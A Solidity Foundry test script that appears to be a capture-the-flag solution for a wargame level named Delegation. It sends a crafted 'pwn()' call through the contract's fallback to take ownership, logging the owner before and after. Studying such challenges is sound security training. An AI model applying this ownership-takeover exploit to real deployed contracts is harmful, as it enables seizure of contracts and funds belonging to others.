// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../instances/Ilevel06.sol";

contract POC is Test {
    Delegation level6 = Delegation(0x36FcDCE0C27A8Fed39C1bF563FbC56359757D369);

    function test() external {
        vm.startBroadcast();
        
        console.log("Current owner is: ", level6.owner());
        (bool success, ) = address(level6).call(abi.encodeWithSignature("pwn()"));
        assertEq(success, true);
        console.log("New owner is :", level6.owner());
        
        vm.stopBroadcast();
    }
}